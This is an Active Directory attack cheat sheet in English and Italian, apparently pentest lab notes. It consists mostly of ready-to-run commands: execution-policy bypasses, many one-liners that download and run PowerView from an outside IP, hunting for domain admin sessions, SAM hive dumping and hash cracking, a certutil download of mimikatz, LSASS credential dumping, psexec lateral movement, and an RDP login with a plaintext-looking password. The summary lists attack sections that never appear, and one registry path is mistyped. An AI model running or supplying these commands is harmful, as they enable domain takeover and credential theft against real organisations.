# Active-Directory-Cheat-Sheet

## Summary
- Bypass Execution Policy

- Enumeration via PowerView

- Archiviazione e recupero credenziali memorizzate (Lateral Movement)
	- Access as Local Admin (Need Privilege Escalation)

- Kerberoasting
	- Access as any user required

- AS-REP Roasting
	- Access as any user required

- Golden Ticket
	- Full domain compromise (domain admin) required 

- Silver Ticket
	- Service hash required 

- Skeleton Key
	- Full domain compromise (domain admin) required

- Bruteforce with kerbrute

## Bypass Execution Policy
```
	- powershell -ep bypass -c "command"
	- powershell -c "command"
	- powershell -encodedcommand
	- $env:PSExecutionPolicyPreference="bypass"
	
```

## Enumeration via Powerview

### PowerView:
- Domain/USER Enumeration
```
	- hostname (vedo il mio name del computer nel dominio)
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-Domain"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainSID"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainPolicy"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -SPN"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Properties samaccountname,memberof"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Properties samaccountname,description"
	- powershell -ep bypass -c "[System.Net.Dns]::GetHostAddresses('xor-app23')" (converte hostname in IP)
```

- Domain Controller
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetDomainController"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetDomainController -Domain [another domain]"
```

- GROUP Enumeration
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -Name 'Domain Admins'"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName "
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroupMember -Name 'Domain admins' "
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -Domain 'xor.com'"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroupMember -Identity "Domain admins" -Recurse | findstr MemberName"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -UserName 'HUA10157' | findstr cn"
```

- COMPUTER Enumeration
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetComputer | select 	samaccountname, operatingsystem"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainComputer -Ping "
```

- Local Group in the machine 
```
	- hostname
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-NetLocalGroup -ComputerName PWVRTJS14.socrome.local"
```

- Logged on the computer 
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-NetLoggedon -ComputerName PWVRTJS14.socrome.local"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-LastLoggedOn -ComputerName PWVRTJS14.socrome.local"
```

- SHARED INFO Enumeration
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Find-DomainShare -Verbose"
	- cd \\fileshare.pentesting.local\FileShare
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke-ShareFinder -Verbose"
```

- GPO Enumeration
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetGPO"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetGPO -ComputerName PWVRTJS14.socrome.local"
	
```

- OU Enumeration
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainOU"
```

- ACL (Lista di ACE (corrisponde ad un unico permesso/accesso) Due tipi: DACL(Identifica gruppi/user che hanno o accesso al servizio) e SACL(Controlla gli accessi (EDR))
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-ObjectAcl -SamAccountName HUA10157 -ResolveGUIDs"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-PathAcl -Path '\\dcorp dc.dollarcorp.moneycorp.local sysvol'"
```

- Forest
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetForest"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetForestDomain"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetForestCatalog"
```

- User Hunting (1: Trova tutte le macchine dove lo user ha local admin access, 2: Trova local admins su tutte le macchine del dominio, 3: Trova pc dove un domanin admin ha sessione, 4: Trova computer dove un domain admin è loggato)
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Find-LocalAdminAccess"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke-EnumerateLocalAdmin Verbose"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke-UserHunter"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke.UserHunter -Stealth"
```

## Archiviazione e recupero credenziali memorizzate (Lateral Movement)
### Poiché l'implementazione di Kerberos da parte di Microsoft utilizza il single sign-on, gli hash delle password devono essere archiviati da qualche parte per rinnovare una richiesta TGT. Nelle versioni correnti di Windows, questi hash sono archiviati nello spazio di memoria LSASS (Local Security Authority Subsystem Service). Se otteniamo l'accesso a questi hash, potremmo craccarli per ottenere la password in chiaro o riutilizzarli per eseguire varie azioni.
### Problemi: Sebbene questo sia l'obiettivo finale del nostro attacco AD, il processo non è così semplice come sembra. Poiché il processo LSASS fa parte del sistema operativo e viene eseguito come SYSTEM, abbiamo bisogno delle autorizzazioni SYSTEM (o amministratore locale) per ottenere l'accesso agli hash archiviati su una destinazione.Per questo motivo, per prendere di mira gli hash archiviati, spesso dobbiamo iniziare il nostro attacco con un'escalation dei privilegi locali. Per rendere le cose ancora più complicate, le strutture di dati utilizzate per archiviare gli hash in memoria non sono pubblicamente documentate e sono anche crittografate con una chiave archiviata in LSASS.

- Uso reg per recupero NTLM
```
			- reg save HKLM\sam sam
			- reg save NKLM\system system
			- samdump2 system sam (NTLM lo piazzi dentro un file .txt)
			- hashcat -m 1000 -a 3 hash.txt rockyou.txt
```
- Con mimikatz eseguibile (mimikatz.exe)
```
			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
			- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hash.txt
			- impacket-psexec username:password@IP
			- xfreerdp /u:david /d:xor.com /p:dsfdf34534tdfGDFG5rdgr  /v:10.11.1.120
```
